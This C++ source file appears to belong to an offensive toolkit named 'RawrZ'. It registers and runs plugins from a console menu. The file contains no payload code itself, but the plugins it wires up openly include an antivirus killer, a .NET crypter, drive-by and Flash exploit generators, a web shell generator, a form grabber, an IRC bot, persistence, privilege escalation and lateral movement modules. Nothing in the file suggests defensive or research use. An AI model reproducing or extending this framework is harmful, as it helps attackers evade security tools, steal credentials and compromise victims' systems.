#include "PluginSystem.h"
#include "PluginIntegration.h"
#include "plugins/ExploitGenerator.h"
#include "plugins/AVKiller.h"
#include "plugins/DotNetCrypter.h"
#include "plugins/BotKiller.h"
#include <iostream>
#include <memory>
#include <vector>

class RawrZPluginIntegration {
private:
    PluginManager pluginManager;
    std::vector<std::unique_ptr<RawrZPlugin>> plugins;

public:
    RawrZPluginIntegration() {
        initializePlugins();
    }

    void initializePlugins() {
        std::cout << "[+] Initializing RawrZ Plugin System...\n";
        
        // Create and register all plugins
        plugins.push_back(std::make_unique<ExploitGenerator>());
        plugins.push_back(std::make_unique<AVKiller>());
        plugins.push_back(std::make_unique<DotNetCrypter>());
        plugins.push_back(std::make_unique<BotKiller>());
        plugins.push_back(std::make_unique<JavaDriveByGenerator>());
        plugins.push_back(std::make_unique<FlashExploitGenerator>());
        plugins.push_back(std::make_unique<WebShellGenerator>());
        plugins.push_back(std::make_unique<MemoryLoader>());
        plugins.push_back(std::make_unique<StringEncryptor>());
        plugins.push_back(std::make_unique<RuntimeObfuscator>());
        plugins.push_back(std::make_unique<FormGrabber>());
        plugins.push_back(std::make_unique<IRCBot>());
        plugins.push_back(std::make_unique<NetworkScanner>());
        plugins.push_back(std::make_unique<PersistenceManager>());
        plugins.push_back(std::make_unique<ShellGenerator>());
        plugins.push_back(std::make_unique<PrivilegeEscalation>());
        plugins.push_back(std::make_unique<LateralMovement>());

        // Register each plugin with the manager
        for (auto& plugin : plugins) {
            if (plugin->initialize()) {
                pluginManager.registerPlugin(plugin.get());
                std::cout << "[+] Registered plugin: " << plugin->getName() << " v" << plugin->getVersion() << std::endl;
            } else {
                std::cout << "[-] Failed to initialize plugin: " << plugin->getName() << std::endl;
            }
        }

        std::cout << "[+] Plugin system initialized with " << plugins.size() << " plugins\n";
    }

    void showPluginMenu() {
        while (true) {
            std::cout << "\n=== RawrZ Plugin System ===\n";
            std::cout << "Available Plugins:\n";
            
            auto availablePlugins = pluginManager.getAvailablePlugins();
            for (size_t i = 0; i < availablePlugins.size(); ++i) {
                std::cout << (i + 1) << ". " << availablePlugins[i] << std::endl;
            }
            
            std::cout << "0. Return to Main Menu\n";
            std::cout << "Choice: ";

            int choice;
            std::cin >> choice;

            if (choice == 0) {
                break;
            } else if (choice > 0 && choice <= static_cast<int>(availablePlugins.size())) {
                executePlugin(choice - 1);
            } else {
                std::cout << "Invalid choice!\n";
            }
        }
    }

    void executePlugin(int pluginIndex) {
        auto availablePlugins = pluginManager.getAvailablePlugins();
        if (pluginIndex >= 0 && pluginIndex < static_cast<int>(availablePlugins.size())) {
            std::string pluginName = availablePlugins[pluginIndex];
            std::cout << "\n[+] Executing plugin: " << pluginName << std::endl;
            
            // Find and execute the plugin
            for (auto& plugin : plugins) {
                if (plugin->getName() == pluginName) {
                    plugin->execute();
                    break;
                }
            }
        }
    }

    void listPlugins() {
        std::cout << "\n=== Available RawrZ Plugins ===\n";
        auto availablePlugins = pluginManager.getAvailablePlugins();
        for (size_t i = 0; i < availablePlugins.size(); ++i) {
            std::cout << (i + 1) << ". " << availablePlugins[i] << std::endl;
        }
    }

    void getPluginInfo(const std::string& pluginName) {
        for (auto& plugin : plugins) {
            if (plugin->getName() == pluginName) {
                std::cout << "\n=== Plugin Information ===\n";
                std::cout << "Name: " << plugin->getName() << std::endl;
                std::cout << "Description: " << plugin->getDescription() << std::endl;
                std::cout << "Version: " << plugin->getVersion() << std::endl;
                
                std::cout << "Options:\n";
                auto options = plugin->getOptions();
                for (const auto& option : options) {
                    std::cout << "  - " << option << std::endl;
                }
                break;
            }
        }
    }

    void configurePlugin(const std::string& pluginName, const std::string& option, const std::string& value) {
        for (auto& plugin : plugins) {
            if (plugin->getName() == pluginName) {
                plugin->setOption(option, value);
                std::cout << "[+] Set " << pluginName << " option " << option << " to " << value << std::endl;
                break;
            }
        }
    }

    PluginManager& getPluginManager() {
        return pluginManager;
    }
};

// Global plugin integration instance
static RawrZPluginIntegration* g_pluginIntegration = nullptr;

// Function to initialize the plugin system (call this from main)
void InitializeRawrZPluginSystem() {
    if (!g_pluginIntegration) {
        g_pluginIntegration = new RawrZPluginIntegration();
    }
}

// Function to show the plugin menu (call this from main menu)
void ShowRawrZPluginMenu() {
    if (g_pluginIntegration) {
        g_pluginIntegration->showPluginMenu();
    } else {
        std::cout << "[-] Plugin system not initialized!\n";
    }
}

// Function to list all plugins
void ListRawrZPlugins() {
    if (g_pluginIntegration) {
        g_pluginIntegration->listPlugins();
    } else {
        std::cout << "[-] Plugin system not initialized!\n";
    }
}

// Function to get plugin information
void GetRawrZPluginInfo(const std::string& pluginName) {
    if (g_pluginIntegration) {
        g_pluginIntegration->getPluginInfo(pluginName);
    } else {
        std::cout << "[-] Plugin system not initialized!\n";
    }
}

// Function to configure a plugin
void ConfigureRawrZPlugin(const std::string& pluginName, const std::string& option, const std::string& value) {
    if (g_pluginIntegration) {
        g_pluginIntegration->configurePlugin(pluginName, option, value);
    } else {
        std::cout << "[-] Plugin system not initialized!\n";
    }
}

// Function to cleanup the plugin system
void CleanupRawrZPluginSystem() {
    if (g_pluginIntegration) {
        delete g_pluginIntegration;
        g_pluginIntegration = nullptr;
    }
}
